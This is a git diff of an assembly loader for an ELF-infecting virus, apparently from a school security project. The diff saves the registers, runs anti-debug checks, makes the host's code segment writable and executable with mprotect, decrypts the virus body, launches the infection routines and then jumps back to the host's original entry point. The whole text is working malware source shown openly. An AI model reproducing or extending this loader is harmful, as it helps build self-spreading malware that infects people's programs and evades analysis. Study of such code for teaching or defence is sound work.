@@ -6,45 +6,50 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/27 02:41:01 by anselme          ###   ########.fr        ;
+;    Updated: 2020/01/04 19:52:14 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
-%define SYSCALL_WRITE		0x01
-%define SYSCALL_MPROTECT	0x0a
-%define STDOUT			0x01
 %define PROT_RWX		0x07
 
 section .text
 	global loader_entry
+	global loader_exit
 	global virus_header_struct
-	global mark_below
-	global return_to_client
 
 extern virus
-extern decypher
+extern wrap_decypher
+extern wrap_mprotect
 extern detect_spy
 
+;----------------------------------; backup all swappable registers
+;                                    (all but rax, rsp, rbp)
 loader_entry:
-;------------------------------; Store variables
-	call mark_below
-virus_header_struct:
-	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
-	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
-	db "rel ptld", "ptldsize", "relvirus"
-	db "relentry", "virusize"
-	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
-;------------------------------; Get variables address
+	push rcx                   ; backup rcx
+	push rdx                   ; backup rdx
+	push rbx                   ; backup rbx
+	push rsi                   ; backup rsi
+	push rdi                   ; backup rdi
+	push r8                    ; backup r8
+	push r9                    ; backup r9
+	push r10                   ; backup r10
+	push r11                   ; backup r11
+	push r12                   ; backup r12
+	push r13                   ; backup r13
+	push r14                   ; backup r14
+	push r15                   ; backup r15
+
+;----------------------------------; extract virus header on stack
+;  ----------------------------------------------------------------------------
 ; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
 ; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
 ; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
+;  ----------------------------------------------------------------------------
+	call mark_below
 mark_below:
-	pop rax
-	push rdx                   ; backup rdx
-	push r14                   ; backup r14
-
-	mov rdx, rax
+	pop rdx                    ; retrieve rip for virus_header_struct
+	add rdx, virus_header_struct - mark_below
 
 	mov r8, rdx
 	mov r9, rdx
@@ -62,70 +67,82 @@ mark_below:
 	mov r11, [r11]
 	mov r14, [r14]
 
-	mov rax, rdx               ; get loader_entry addr
-	sub rax, virus_header_struct - loader_entry
+	mov rcx, rdx               ; get loader_entry addr
+	sub rcx, virus_header_struct - loader_entry
 
-	push r15                   ; backup r15
-	mov r15, rax
-	xchg r15, r8
-	sub r8, r15                ; r8 = rax - r8
-	mov r15, rax
-	xchg r15, r10
-	add r10, r15               ; r10 = rax + r10
-	mov r15, rax
-	xchg r15, r11
-	sub r11, r15               ; r11 = rax - r11
-	pop r15                    ; restore r15
+	mov r12, rcx
+	xchg r12, r8
+	sub r8, r12                ; r8 = rcx - r8
+	mov r12, rcx
+	xchg r12, r10
+	add r10, r12               ; r10 = rcx + r10
+	mov r12, rcx
+	xchg r12, r11
+	sub r11, r12               ; r11 = rcx - r11
 
-	push rax                   ; save loader_entry  [rsp + 40]
+	push r14                   ; save virus size    [rsp + 48]
+	push rcx                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
 	push r11                   ; save entry addr    [rsp + 8]
 	push rdx                   ; save seed          [rsp]
-;------------------------------; Show-off
-%ifdef DEBUG
-	mov rax, 0x00000a2e2e2e2e59
-	push rax
-	mov rax, 0x444f4f572e2e2e2e
-	push rax
 
-	; write(1, "....WOODY....\n", 14);
-	mov rdi, STDOUT
-	mov rsi, rsp
-	mov rdx, 14
-	mov rax, SYSCALL_WRITE
-	syscall
-
-	add rsp, 16
-%endif
-;------------------------------; check if client behaves well
+;----------------------------------; run anti debug
 	call detect_spy
 	test rax, rax
 	jnz return_to_client
-;------------------------------; make ptld writable
-	mov r8, [rsp + 32]         ; get ptld addr
-	mov r9, [rsp + 24]         ; get ptld len
 
-	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
-
-	mov rdi, r8
-	mov rsi, r9
+;----------------------------------; make ptld writable
+	mov rdi, [rsp + 32]        ; get ptld addr
+	mov rsi, [rsp + 24]        ; get ptld len
 	mov rdx, PROT_RWX
-	mov rax, SYSCALL_MPROTECT
-	syscall
-;------------------------------; decypher virus
-	mov rdi, [rsp + 16]        ; get virus_addr
-	mov rsi, r14               ; get virus_size
+	push rdi
+	push rsi
+	push rdx
+	call wrap_mprotect
+	add rsp, 24
+	test rax, rax
+	jnz return_to_client
 
-	call decypher
-;------------------------------; launch virus
+;----------------------------------; decypher virus
+	mov rdi, [rsp + 16]        ; get virus_addr
+	mov rsi, [rsp + 48]        ; get virus_size
+	push rdi
+	push rsi
+	call wrap_decypher
+	add rsp, 16
+
+;----------------------------------; launch infection routines
 	call virus
-;------------------------------; return to client entry
+
+;----------------------------------; restore state, return to client code
 return_to_client:
-	mov r11, [rsp + 8]         ; get entry addr
-	add rsp, 48                ; restore stack as it was
+	mov rax, [rsp + 8]         ; get entry addr
+	add rsp, 56                ; restore stack as it was
+
+;----------------------------------; restore registers
+	pop r15                    ; restore r15
 	pop r14                    ; restore r14
+	pop r13                    ; restore r13
+	pop r12                    ; restore r12
+	pop r11                    ; restore r11
+	pop r10                    ; restore r10
+	pop r9                     ; restore r9
+	pop r8                     ; restore r8
+	pop rdi                    ; restore rdi
+	pop rsi                    ; restore rsi
+	pop rbx                    ; restore rbx
 	pop rdx                    ; restore rdx
-	push r11
+	pop rcx                    ; restore rcx
+
+	push rax
 	ret
+loader_exit:
+
+virus_header_struct:
+	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
+	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
+	db "rel ptld", "ptldsize", "relvirus"
+	db "relentry", "virusize"
+	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
